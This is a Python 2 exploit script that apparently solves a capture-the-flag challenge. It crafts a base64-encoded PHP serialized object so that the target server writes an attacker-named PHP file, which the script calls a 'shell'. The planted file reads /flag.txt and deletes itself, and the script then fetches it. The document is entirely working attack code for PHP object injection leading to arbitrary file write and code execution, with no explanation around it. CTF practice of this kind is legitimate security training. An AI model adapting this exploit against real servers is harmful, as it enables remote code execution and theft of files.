import base64
import requests
from random import randrange

base = "http://ctf.canthack.me:8889/"

serial = 'O:7:"Covfefe":4:{s:2:"id";s:%d:"%s";s:17:"allowed_additions";a:8:{i:0;s:4:"Milk";i:1;s:5:"Cream";i:2;s:6:"Whisky";i:3;s:3:"Rum";i:4;s:6:"Kahlua";i:5;s:7:"Aquavit";i:6;s:7:"Vanilla";i:7;s:%d:"%s";}s:19:"requested_additions";a:1:{i:0;s:%d:"%s";}s:4:"time";i:1503323731;}'

fname = "%d.php" % randrange(999999)
payload = "<?php readfile('/flag.txt'); unlink('%s');?>" % fname
print fname

serial = serial % (len(fname), fname, len(payload), payload, len(payload), payload)
serial = base64.b64encode(serial)

#push shell
print requests.request("WHEN", base+"index.php?"+serial).text
#get response
print requests.get(base+"covfefe/"+fname).text

